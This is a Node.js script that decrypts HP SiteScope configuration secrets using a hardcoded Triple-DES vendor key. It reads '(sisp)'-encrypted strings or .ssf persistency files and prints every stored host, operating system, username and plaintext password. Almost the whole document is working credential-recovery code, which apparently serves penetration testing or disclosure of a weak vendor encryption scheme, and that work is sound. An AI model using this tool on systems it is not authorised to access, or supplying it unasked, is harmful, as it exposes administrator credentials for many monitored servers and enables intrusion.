#!/usr/bin/env node
"use strict";

const ArgumentParser      = require("argparse").ArgumentParser;
const fs                  = require("fs");
const javaDeserialization = require("java-deserialization");
const crypto              = require("crypto");

const ENCODING = "UTF-8";
const KEY = new Buffer([56, -116, -53, 93, -29, 2, 117, -50, -20, 31, -116, -71, -113, 67, -63, -70, -108, -53, -26, -17, 110, 41, -94, 107]);

var parser = new ArgumentParser({
  version: "0.0.1",
  addHelp: true,
  description: "HP SiteScope Configuration Decryptor v0.0.1"
});

parser.addArgument(
  [ "-p", "--password" ],
  {
    help: "a password to decrypt, for example: (sisp)va1xBRC68d2p/zkd3YVpPg=="
  }
);

parser.addArgument(
  [ "--ssf-file" ],
  {
    help: "an ssf file to decrypt (from C:\\SiteScope\\persistency\\*.ssf)"
  }
);

var args = parser.parseArgs();


function stringDecrypt(encrypted_str) {
    if (encrypted_str.startsWith("(sisp)") !== true) {
        throw new Error("Encrypted string format error");
    }

    var decrypted_str = "";

    try {
        var decipher = crypto.createDecipheriv("des-ede3", KEY, "");
        var s = decipher.update(encrypted_str.substring(6), "base64", ENCODING);

        decrypted_str = s + decipher.final(ENCODING);
    } catch (err) {
        throw new Error("Encrypted string format error");
    }

    return decrypted_str;
}

function valueTest (obj) {
    return (typeof obj === "string") && obj.trim();
}

if (args.password !== null) {
    console.log(stringDecrypt(args.password));
} else if (args.ssf_file !== null) {
    var file = fs.readFileSync(args.ssf_file);
    var java_objects = javaDeserialization.parse(file);

    var java_index;

    for (var i in java_objects) {
        if(typeof java_objects[i].elementData === "object") {
            java_index = i;
            break;
        }
    }

    for (var i in java_objects[java_index].elementData) {
        var obj;
                 
        try {
            obj = java_objects[java_index].elementData[i].obj.objectContent.obj;
        } catch (err) {
            continue;
        }

        if (valueTest(obj._host)) {
              var host = stringDecrypt(obj._host);
              var os;
              var user;
              var password;

              if (valueTest(obj._os)) {
                  os = stringDecrypt(obj._os);
              }

              if (valueTest(obj._login)) {
                  user = stringDecrypt(obj._login);
              }

              if (valueTest(obj._password)) {
                  password = stringDecrypt(obj._password);
              }

              console.log("HOST: " + host + "; OS: " + os + "; USER: " + user + "; PASSWORD: " + password);
        }
    }
}